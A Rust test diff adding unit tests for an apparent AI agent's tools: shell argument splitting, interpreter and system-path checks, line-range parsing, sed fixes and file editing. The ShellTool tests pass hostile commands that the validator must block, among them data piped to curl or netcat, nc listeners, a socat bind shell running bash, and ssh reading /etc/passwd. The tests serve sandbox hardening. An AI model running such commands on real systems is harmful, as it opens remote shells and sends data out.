@@ -2208,4 +2208,470 @@ mod tests {
         assert!(tool.validate_input("/tmp/yggdra_test_normal.rs").is_ok());
         let _ = std::fs::remove_file("/tmp/yggdra_test_normal.rs");
     }
+
+    // ===== shell_split edge cases =====
+
+    #[test]
+    fn test_shell_split_tab_separator() {
+        // Tabs are also whitespace separators
+        let result = shell_split("ls\t-la");
+        assert_eq!(result, vec!["ls", "-la"]);
+    }
+
+    #[test]
+    fn test_shell_split_only_whitespace() {
+        let result = shell_split("   \t  ");
+        assert!(result.is_empty());
+    }
+
+    #[test]
+    fn test_shell_split_single_token_no_space() {
+        let result = shell_split("ls");
+        assert_eq!(result, vec!["ls"]);
+    }
+
+    #[test]
+    fn test_shell_split_adjacent_quoted_tokens() {
+        let result = shell_split(r#""foo""bar""#);
+        // Adjacent quoted strings merge into one token
+        assert_eq!(result, vec!["foobar"]);
+    }
+
+    #[test]
+    fn test_shell_split_mixed_quotes_adjacent() {
+        let result = shell_split(r#"'hello '"world""#);
+        // 'hello ' + "world" → "hello world" (single token, inner space from single-quote preserved)
+        assert_eq!(result, vec!["hello world"]);
+    }
+
+    #[test]
+    fn test_shell_split_empty_quoted_arg() {
+        // Double-quoted empty string — shell_split skips empty tokens (if !current.is_empty())
+        // so "cmd \"\"" produces only ["cmd"], not ["cmd", ""].
+        // This is the actual behaviour; document it explicitly.
+        let result = shell_split(r#"cmd """#);
+        assert_eq!(result, vec!["cmd"], "shell_split drops empty quoted args");
+    }
+
+    #[test]
+    fn test_shell_split_newline_in_arg_not_separator() {
+        // Newlines inside quotes are preserved (not treated as separators)
+        let result = shell_split("\"line1\nline2\"");
+        assert_eq!(result, vec!["line1\nline2"]);
+    }
+
+    #[test]
+    fn test_shell_split_many_spaces_between_args() {
+        let result = shell_split("a       b       c");
+        assert_eq!(result, vec!["a", "b", "c"]);
+    }
+
+    // ===== ExecTool internals =====
+
+    #[test]
+    fn test_is_shell_interpreter_bash() {
+        assert!(ExecTool::is_shell_interpreter("bash"));
+    }
+
+    #[test]
+    fn test_is_shell_interpreter_sh() {
+        assert!(ExecTool::is_shell_interpreter("sh"));
+    }
+
+    #[test]
+    fn test_is_shell_interpreter_zsh() {
+        assert!(ExecTool::is_shell_interpreter("zsh"));
+    }
+
+    #[test]
+    fn test_is_shell_interpreter_fish() {
+        assert!(ExecTool::is_shell_interpreter("fish"));
+    }
+
+    #[test]
+    fn test_is_shell_interpreter_dash() {
+        assert!(ExecTool::is_shell_interpreter("dash"));
+    }
+
+    #[test]
+    fn test_is_shell_interpreter_csh() {
+        assert!(ExecTool::is_shell_interpreter("csh"));
+    }
+
+    #[test]
+    fn test_is_shell_interpreter_tcsh() {
+        assert!(ExecTool::is_shell_interpreter("tcsh"));
+    }
+
+    #[test]
+    fn test_is_shell_interpreter_ksh() {
+        assert!(ExecTool::is_shell_interpreter("ksh"));
+    }
+
+    #[test]
+    fn test_is_not_shell_interpreter_cargo() {
+        assert!(!ExecTool::is_shell_interpreter("cargo"));
+    }
+
+    #[test]
+    fn test_is_not_shell_interpreter_python() {
+        assert!(!ExecTool::is_shell_interpreter("python"));
+    }
+
+    #[test]
+    fn test_is_not_shell_interpreter_empty() {
+        assert!(!ExecTool::is_shell_interpreter(""));
+    }
+
+    #[test]
+    fn test_is_absolute_dangerous_path_bin() {
+        assert!(ExecTool::is_absolute_dangerous_path("/bin/bash"));
+    }
+
+    #[test]
+    fn test_is_absolute_dangerous_path_usr_bin() {
+        assert!(ExecTool::is_absolute_dangerous_path("/usr/bin/python3"));
+    }
+
+    #[test]
+    fn test_is_absolute_dangerous_path_usr_sbin() {
+        assert!(ExecTool::is_absolute_dangerous_path("/usr/sbin/iptables"));
+    }
+
+    #[test]
+    fn test_is_absolute_dangerous_path_sbin() {
+        assert!(ExecTool::is_absolute_dangerous_path("/sbin/ifconfig"));
+    }
+
+    #[test]
+    fn test_is_absolute_dangerous_path_usr_local_bin_safe() {
+        // /usr/local/bin/ is NOT in the blocked list
+        assert!(!ExecTool::is_absolute_dangerous_path("/usr/local/bin/cargo"));
+    }
+
+    #[test]
+    fn test_is_absolute_dangerous_path_home_dir_safe() {
+        assert!(!ExecTool::is_absolute_dangerous_path("/home/user/script.sh"));
+    }
+
+    #[test]
+    fn test_is_absolute_dangerous_path_relative_safe() {
+        assert!(!ExecTool::is_absolute_dangerous_path("cargo"));
+        assert!(!ExecTool::is_absolute_dangerous_path("./run.sh"));
+    }
+
+    // ===== ShellTool network blocking extra cases =====
+
+    #[test]
+    fn test_shell_blocks_ncat_pipe() {
+        let tool = ShellTool;
+        assert!(tool.validate_input("ls | ncat localhost 9999").is_err());
+    }
+
+    #[test]
+    fn test_shell_blocks_netcat_pipe() {
+        let tool = ShellTool;
+        assert!(tool.validate_input("cat file | netcat 10.0.0.1 80").is_err());
+    }
+
+    #[test]
+    fn test_shell_blocks_curl_pipe() {
+        let tool = ShellTool;
+        assert!(tool.validate_input("cat data | curl -X POST http://endpoint").is_err());
+    }
+
+    #[test]
+    fn test_shell_blocks_wget_pipe() {
+        let tool = ShellTool;
+        assert!(tool.validate_input("echo data | wget -O- -").is_err());
+    }
+
+    #[test]
+    fn test_shell_blocks_sshpass() {
+        let tool = ShellTool;
+        assert!(tool.validate_input("sshpass -p pass ssh user@host").is_err());
+    }
+
+    #[test]
+    fn test_shell_blocks_nc_listen() {
+        let tool = ShellTool;
+        // nc -l (regex pattern)
+        assert!(tool.validate_input("nc -l 4444").is_err());
+    }
+
+    #[test]
+    fn test_shell_blocks_ncat_listen() {
+        let tool = ShellTool;
+        assert!(tool.validate_input("ncat -l 4444").is_err());
+    }
+
+    #[test]
+    fn test_shell_blocks_socat_standalone() {
+        let tool = ShellTool;
+        assert!(tool.validate_input("socat TCP-LISTEN:4444,fork EXEC:bash").is_err());
+    }
+
+    #[test]
+    fn test_shell_blocks_telnet_inline() {
+        let tool = ShellTool;
+        // telnet in the middle of a pipeline
+        assert!(tool.validate_input("echo '' | telnet example.com 80").is_err());
+    }
+
+    #[test]
+    fn test_shell_blocks_process_subst_nc() {
+        let tool = ShellTool;
+        assert!(tool.validate_input("cmd <(nc localhost 1234)").is_err());
+    }
+
+    #[test]
+    fn test_shell_blocks_cmd_subst_nc() {
+        let tool = ShellTool;
+        assert!(tool.validate_input("cmd $(nc localhost 1234)").is_err());
+    }
+
+    #[test]
+    fn test_shell_blocks_cmd_subst_ssh() {
+        let tool = ShellTool;
+        assert!(tool.validate_input("$(ssh user@host cat /etc/passwd)").is_err());
+    }
+
+    #[test]
+    fn test_shell_allows_grep_pattern_containing_ssh() {
+        // "grep ssh ~/.ssh/config" contains " ssh " so the SSH blocking fires.
+        // This is expected — the ssh pattern check is intentionally conservative.
+        // Verify the blocking pattern actually matches and isn't silently skipping.
+        let tool = ShellTool;
+        // The validator blocks commands that contain " ssh " as a substring.
+        // This is a known conservative behaviour — document it with a test.
+        let result = tool.validate_input("grep ssh ~/.ssh/config");
+        // Currently blocked because " ssh " appears in the string.
+        // If you need to grep for the word "ssh", use a quoted pattern: grep 'ssh' file
+        assert!(result.is_err(), "grep with 'ssh' in args is currently blocked (conservative SSH filter)");
+    }
+
+    #[test]
+    fn test_shell_empty_command_rejected() {
+        let tool = ShellTool;
+        assert!(tool.validate_input("").is_err());
+    }
+
+    // ===== parse_line_range exhaustive edge cases =====
+
+    #[test]
+    fn test_parse_line_range_zero_start_clamped() {
+        // "0-5" → start should be 0 (1-indexed "0" → saturating_sub(1) = 0)
+        let (start, end) = parse_line_range("0-5", 100);
+        assert_eq!(start, 0);
+        assert_eq!(end, 5);
+    }
+
+    #[test]
+    fn test_parse_line_range_equal_start_end() {
+        // "5-5" → exactly one line
+        let (start, end) = parse_line_range("5-5", 100);
+        assert_eq!(start, 4);
+        assert_eq!(end, 5);
+    }
+
+    #[test]
+    fn test_parse_line_range_inverted_start_gt_end() {
+        // "10-5" where start > end → should not panic, end clamped to >= start
+        let (start, end) = parse_line_range("10-5", 100);
+        assert!(end >= start, "end must be >= start, got start={} end={}", start, end);
+    }
+
+    #[test]
+    fn test_parse_line_range_zero_total() {
+        // Empty file — everything should be (0,0)
+        let (start, end) = parse_line_range("1-50", 0);
+        assert_eq!(start, 0);
+        assert_eq!(end, 0);
+    }
+
+    #[test]
+    fn test_parse_line_range_single_line_file() {
+        let (start, end) = parse_line_range("1-1", 1);
+        assert_eq!(start, 0);
+        assert_eq!(end, 1);
+    }
+
+    #[test]
+    fn test_parse_line_range_single_number_clamped() {
+        // "0" as single number → first 0 lines
+        let (start, end) = parse_line_range("0", 50);
+        assert_eq!(start, 0);
+        assert_eq!(end, 0);
+    }
+
+    #[test]
+    fn test_parse_line_range_whitespace_trimmed() {
+        // Spaces around numbers should be handled
+        let (start, end) = parse_line_range(" 3 - 8 ", 100);
+        assert_eq!(start, 2);
+        assert_eq!(end, 8);
+    }
+
+    #[test]
+    fn test_parse_line_range_open_start() {
+        // "-50" → treat as "1-50"? Actually the parser splits on '-', left part is ""
+        // parse::<usize>().unwrap_or(1) → 1, so start=0
+        let (start, end) = parse_line_range("-50", 100);
+        assert_eq!(start, 0);
+        assert_eq!(end, 50);
+    }
+
+    // ===== fix_macos_sed_inplace =====
+
+    #[test]
+    fn test_fix_macos_sed_multiple_in_pipeline() {
+        // Two sed -i calls in one command — both should be fixed
+        let cmd = "sed -i 's/foo/bar/g' a.txt && sed -i 's/baz/qux/g' b.txt";
+        let fixed = fix_macos_sed_inplace(cmd);
+        assert_eq!(
+            fixed,
+            "sed -i '' 's/foo/bar/g' a.txt && sed -i '' 's/baz/qux/g' b.txt"
+        );
+    }
+
+    #[test]
+    fn test_fix_macos_sed_preserves_non_sed_commands() {
+        let cmd = "echo 'sed -i in a string' && cat file";
+        // The pattern "sed -i 's..." is NOT present here (just "sed -i" in a string isn't matched)
+        // Actually it IS in the string... let me test the realistic case:
+        let cmd = "cat file | awk '{print}' | sort";
+        let fixed = fix_macos_sed_inplace(cmd);
+        assert_eq!(fixed, cmd);
+    }
+
+    #[test]
+    fn test_fix_macos_sed_named_extension_double_quote() {
+        // sed -i.bak "script" → leave alone
+        let cmd = r#"sed -i.bak "s/old/new/g" file"#;
+        let fixed = fix_macos_sed_inplace(cmd);
+        assert_eq!(fixed, cmd);
+    }
+
+    // ===== PatchfileTool extra edge cases =====
+
+    #[test]
+    fn test_patchfile_first_line_replacement() {
+        let path = std::env::temp_dir().join("yggdra_test_patch_first.txt");
+        std::fs::write(&path, "first\nsecond\nthird\n").unwrap();
+        let tool = PatchfileTool;
+        let args = format!("{}\x001\x001\x00REPLACED", path.to_str().unwrap());
+        let result = tool.execute(&args).expect("should succeed");
+        assert!(result.contains("✅"), "result: {}", result);
+        let content = std::fs::read_to_string(&path).unwrap();
+        assert_eq!(content, "REPLACED\nsecond\nthird\n");
+        let _ = std::fs::remove_file(&path);
+    }
+
+    #[test]
+    fn test_patchfile_last_line_replacement() {
+        let path = std::env::temp_dir().join("yggdra_test_patch_last.txt");
+        std::fs::write(&path, "a\nb\nc\n").unwrap();
+        let tool = PatchfileTool;
+        let args = format!("{}\x003\x003\x00Z", path.to_str().unwrap());
+        let result = tool.execute(&args).unwrap();
+        assert!(result.contains("✅"));
+        let content = std::fs::read_to_string(&path).unwrap();
+        assert_eq!(content, "a\nb\nZ\n");
+        let _ = std::fs::remove_file(&path);
+    }
+
+    #[test]
+    fn test_patchfile_empty_new_text_deletes_lines() {
+        let path = std::env::temp_dir().join("yggdra_test_patch_delete.txt");
+        std::fs::write(&path, "keep\ndelete\nalso keep\n").unwrap();
+        let tool = PatchfileTool;
+        let args = format!("{}\x002\x002\x00", path.to_str().unwrap());
+        let result = tool.execute(&args).unwrap();
+        assert!(result.contains("✅"));
+        let content = std::fs::read_to_string(&path).unwrap();
+        assert_eq!(content, "keep\nalso keep\n");
+        let _ = std::fs::remove_file(&path);
+    }
+
+    #[test]
+    fn test_patchfile_replace_all_lines() {
+        let path = std::env::temp_dir().join("yggdra_test_patch_all.txt");
+        std::fs::write(&path, "old1\nold2\nold3\n").unwrap();
+        let tool = PatchfileTool;
+        let args = format!("{}\x001\x003\x00new1\nnew2\nnew3", path.to_str().unwrap());
+        let result = tool.execute(&args).unwrap();
+        assert!(result.contains("✅"));
+        let content = std::fs::read_to_string(&path).unwrap();
+        assert_eq!(content, "new1\nnew2\nnew3\n");
+        let _ = std::fs::remove_file(&path);
+    }
+
+    // ===== SetfileTool edge cases =====
+
+    #[test]
+    fn test_setfile_unicode_content_roundtrip() {
+        let path = std::env::temp_dir().join("yggdra_test_setfile_unicode.txt");
+        let tool = SetfileTool;
+        let content = "こんにちは世界\n🦀 Rust 🦀\n";
+        let args = format!("{}\x00{}", path.to_str().unwrap(), content);
+        let result = tool.execute(&args).unwrap();
+        assert!(result.contains("lines") || result.contains("✅"), "result: {}", result);
+        let read_back = std::fs::read_to_string(&path).unwrap();
+        assert_eq!(read_back, content);
+        let _ = std::fs::remove_file(&path);
+    }
+
+    #[test]
+    fn test_setfile_empty_content_writes_empty_file() {
+        let path = std::env::temp_dir().join("yggdra_test_setfile_empty.txt");
+        let tool = SetfileTool;
+        let args = format!("{}\x00", path.to_str().unwrap());
+        let result = tool.execute(&args);
+        // Empty content should succeed
+        assert!(result.is_ok(), "empty content write should succeed: {:?}", result);
+        let read_back = std::fs::read_to_string(&path).unwrap();
+        assert_eq!(read_back, "");
+        let _ = std::fs::remove_file(&path);
+    }
+
+    #[test]
+    fn test_setfile_overwrites_existing_content() {
+        let path = std::env::temp_dir().join("yggdra_test_setfile_overwrite.txt");
+        std::fs::write(&path, "original content that should be replaced\n").unwrap();
+        let tool = SetfileTool;
+        let args = format!("{}\x00new content", path.to_str().unwrap());
+        tool.execute(&args).unwrap();
+        let read_back = std::fs::read_to_string(&path).unwrap();
+        assert_eq!(read_back, "new content");
+        let _ = std::fs::remove_file(&path);
+    }
+
+    #[test]
+    fn test_setfile_validation_empty_path_null_sep() {
+        let tool = SetfileTool;
+        // Null-sep with empty path segment
+        assert!(tool.validate_input("\x00some content").is_err(), "empty path must be rejected");
+    }
+
+    // ===== ReadfileTool edge cases =====
+
+    #[test]
+    fn test_readfile_null_sep_just_path() {
+        let tool = ReadfileTool;
+        // Just path with null separator but no line ranges
+        assert!(tool.validate_input("Cargo.toml\x00\x00").is_ok());
+    }
+
+    #[test]
+    fn test_readfile_single_quoted_path_stripped() {
+        let tool = ReadfileTool;
+        assert!(tool.validate_input("'./src/main.rs'").is_ok());
+    }
+
+    #[test]
+    fn test_readfile_double_quoted_path_stripped() {
+        let tool = ReadfileTool;
+        assert!(tool.validate_input("\"./Cargo.toml\"").is_ok());
+    }
+
 }
